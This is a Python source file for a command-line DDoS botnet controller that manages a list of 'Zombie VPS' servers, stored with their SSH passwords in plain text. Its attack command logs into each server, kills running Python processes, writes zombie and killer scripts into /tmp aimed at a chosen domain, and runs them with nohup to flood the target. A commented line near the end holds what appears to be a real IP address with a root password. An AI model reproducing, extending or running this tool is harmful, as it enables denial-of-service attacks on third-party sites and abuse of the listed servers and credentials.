import os, re, sys, argparse, paramiko, socket, validators, random, time
from threading import Thread

class VPS(object):

    def clear(self):
        print ("\r"+100*" ", end="")

    def commander(self, host, uname, passwd, cmd):
        def connect(host, uname, passwd):
            cli = paramiko.SSHClient()
            cli.load_system_host_keys()
            cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                cli.connect(host, username=uname, password=passwd, timeout=10)
            except:
                return False
            return cli
        
        print("")
        taskint = 1
        for task in cmd:
            self.clear()
            time.sleep(1)
            print ("\r=> {}: Execute Command {}".format(str(host), str(taskint)), end="")
            
            err = False
            cli = connect(host, uname, passwd)
            if not cli:
                self.clear()
                print ("\r=> {}: Connection Failure".format(str(host)))
                return False

            try:
                stdin, stdout, stderr = cli.exec_command(task)
            except Exception as e:
                self.clear()
                print ("\r=> {}: Failed Execution Command: {}".format(str(host), e))
                return False

            for line in stdout:
                self.clear()
                print ("\r=> {}: {}".format(str(host), str(line.replace("\n", ""))), end="")
            taskint += 1
            cli.close()
        
        return True

        print ("=> {}: Connecting".format(str(host)), end="")
        err = False
        cli = connect(host, uname, passwd)
        if not cli:
            self.clear()
            print ("\r=> {}: Connection Failure".format(str(host)))
            return False
                
        for task in cmd:
            try:
                stdin, stdout, stderr = cli.exec_command(task)
            except Exception as e:
                self.clear()
                print ("\r=> {}: Failed Execution Command: {}".format(str(host), e))
                return False
            
            for line in stdout:
                self.clear()
                print ("\r=> {}: {}".format(str(host), str(line.replace("\n", ""))), end="")
        cli.close()
        print("")

class Main(object):
    def __init__(self):
        self.config = {
            "zombie_path": "parts/zombie.xay",
            "zombie_shell": "/tmp/like-me.py",
            "killer_path": "parts/idoor.xay",
            "killer_shell": "/tmp/kill-me.sh",
            "vps_path": ".vps.xay"
        }
        parser = argparse.ArgumentParser(
            description = "Pretends to be Touchme",
            usage = '''{0} <command> [<args>]\n
Add VPS Command: \t {0} save <HOST> <USERNAME> <PASSWORD>
Delete VPS Command: \t {0} delete <HOST>
Lists VPS Command: \t {0} lists
Attack DoS Command: \t {0} attack <DOMAIN/HOST TARGET> <THREAD> <TIMER>
            '''.format(str(sys.argv[0]))
        )
        parser.add_argument('command', help='Subcommand to run')
        args = parser.parse_args(sys.argv[1:2])
        if not hasattr(self, args.command):
            print ("Unrecognized command")
            parser.print_help()
            sys.exit(0)
        getattr(self, args.command)()

    def save(self):
        data = sys.argv[2:]
        try:
            host = data[0]
        except:
            print ("=> Empty args <HOST>")
            host = input(">> Input Host: ").strip()
        if len(host.split(".")) != 4:
            print ("=> Invalid Host")
            sys.exit(0)

        try:
            username = data[1]
        except:
            print ("=> Empty args <USERNAME>")
            username = input(">> Input Username: ").strip()
        if not username:
            print ("=> Invalid Username")
            sys.exit(0)

        try:
            password = data[2]
        except:
            print ("=> Empty args <PASSWORD>")
            password = input(">> Input Password: ").strip()
            sys.exit(0)
        if not password:
            print ("=> Invalid Password")
            sys.exit(0)

        for vps in open(self.config['vps_path']):
            vps = vps.strip()
            vps = vps.split("|")[0]
            if host == vps:
                print ("=> Duplicate Host")
                sys.exit(0)

        client = paramiko.SSHClient()
        client.load_system_host_keys()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(host, username=username, password=password, timeout=10)
        except:
            print ("=> {}: Connection Failed".format(str(host)))
            sys.exit(0)
        data = "{}|{}|{}\n".format(str(host), str(username), str(password))
        open(self.config['vps_path'], "a").write(data)
        print ("=> Success add Zombie VPS")

    def delete(self):
        data = sys.argv[2:]
        try:
            host = data[0]
        except:
            print ("=> Empty args <HOST>")
            host = input(">> Input Host: ").strip()
        if not host:
            print ("=> Invalid Host")
            sys.exit(0)
        
        vpss = open(self.config['vps_path']).read().splitlines()
        num = 0
        for vps in vpss:
            ip, uname, passwd = vps.split("|")
            if host == ip:
                del vpss[num]
                with open(self.config['vps_path'], "w") as txt:
                    for vp in vpss:
                        txt.write(vp+"\n")
                print ("=> Success Delete {}".format(str(ip)))
                sys.exit(0)
            num += 1
        print ("=> {} Nothing in Zombie VPS lists".format(str(host)))

    def lists(self):
        total = 1
        for vps in open(self.config['vps_path']):
            vps = vps.strip()
            host, username, password = vps.split("|")
            print ("[{}]> Host: {} | Username: {} | Password: {}".format(str(total), str(host), str(username), str(password)))
            total += 1
        print ("=> Done")

    def attack(self):
        data = sys.argv[2:]
        try:
            target = data[0]
        except:
            print ("=> Empty args <DOMAIN/HOST TARGET>")
            target = input(">> Input Target Domain/Host: ").strip()
        if not target:
            print ("=> Invalid Target")
            sys.exit(0)
        if "://" in target:
            target = target.replace("http://", "")
            target = target.replace("https://", "")
        if target.endswith("/"):
            target = target[:-1]
        
        try:
            thread = data[1]
        except:
            print ("=> Empty args <THREAD>")
            thread = input(">> Input Thread: ").strip()
        try:
            thread = int(thread)
        except:
            print ("=> Input Thread only numbers")
            sys.exit(0)
        
        try:
            timer = data[2]
        except:
            print ("=> Empty args <TIMER>")
            timer = input(">> Input Timer: ").strip()
        try:
            timer = int(timer)
        except:
            print ("=> Input Timer only numbers")
            sys.exit(0)
        
        zfile = open(self.config['zombie_path']).read()
        zshell = self.config['zombie_shell']

        ifile = open(self.config['killer_path']).read()
        ishell = self.config['killer_shell']

        zfile = zfile.replace("{[TARGET]}", "\""+target+"\"")   
        zfile = zfile.replace("{[THREAD]}", str(thread))

        ifile = ifile.replace("{[TIMER]}", str(timer))
        ifile = ifile.replace("{[ZOMBIE_PATH]}", zshell)
        ifile = ifile.replace("{[KILLER_PATH]}", ishell)
        
        cmd = []
        cmd.append("killall python || killall python2 || killall python3")
        cmd.append("echo -e '{}' > {}".format(str(zfile), str(zshell)))
        cmd.append("echo -e '{}' > {}".format(str(ifile), str(ishell)))
        cmd.append("nohup python {0} || nohup python2 {0} || nohup python3 {0} || echo Need Manual Insall Python".format(str(zshell)))
        cmd.append("nohup sh {} || echo Failed run Killer".format(str(ishell)))

        zm = VPS()
        for vps in open(self.config['vps_path']):
            vps = vps.strip()
            host, uname, passwd = vps.split("|")
            # zm.commander(host, uname, passwd, cmd)
            Thread(target=zm.commander, args=(host, uname, passwd, cmd)).start()

        
# vp = VPS()
# cmd = []
# cmd.append("apt update -y || echo Failed Update")
# vp.connect("47.241.90.59", "root", "Dynaplast123!", cmd)

if __name__ == '__main__':
    Main()